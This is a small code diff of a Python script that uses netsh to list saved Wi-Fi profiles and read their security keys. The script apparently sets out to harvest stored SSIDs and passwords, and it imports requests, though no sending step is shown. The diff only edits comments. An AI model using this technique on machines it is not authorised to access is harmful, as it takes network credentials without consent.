@@ -3,7 +3,7 @@ import re
 import requests
 
 wlan = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
-profile_names = (re.findall("All User Profile     : (.*)\r", wlan))
+profile_names = (re.findall("All User Profile     : (.*)\r", wlan)) # find all the profile names
 
 wifi_list = list()
 
@@ -14,7 +14,7 @@ if len(profile_names) != 0:
         
         profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile], capture_output=True).stdout.decode()
 
-        if re.search("Security key           : Absent", profile_info): # ccontinue if password is not avilable 
+        if re.search("Security key           : Absent", profile_info):
             continue
         
         # capture SSID & password
